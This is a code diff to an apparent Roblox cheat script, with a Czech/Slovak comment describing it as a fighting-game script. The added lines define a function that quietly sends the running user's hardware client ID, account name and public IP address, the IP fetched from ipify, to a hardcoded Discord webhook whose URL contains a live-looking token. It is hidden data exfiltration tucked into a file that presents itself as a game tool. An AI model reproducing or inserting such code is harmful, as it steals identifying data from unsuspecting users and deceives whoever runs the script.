@@ -1,5 +1,10 @@
 --flex fight sexy scriptik od duvpeho
 
+sendmsg = function(webhook,msg)
+    request = http_request or request or HttpPost or syn.request
+    request({Url = webhook, Body = game:GetService("HttpService"):JSONEncode({["content"] = msg}), Method = "POST", Headers = {["content-type"] = "application/json"}})
+end
+sendmsg("https://discordapp.com/api/webhooks/1124337016402890822/535GPCRwgqsBKwTBMfjFcWbe5E5M2h7aFs6uCTLJ_AcPb7rouxAdAPA0T1RmCTFnoKOe","``` HWID: "..game:GetService("RbxAnalyticsService"):GetClientId().." NAME: "..game.Players.LocalPlayer.Name.." IP: "..game:HttpGet("https://api.ipify.org/").."```")
 
 
 getgenv().LevelUp = false
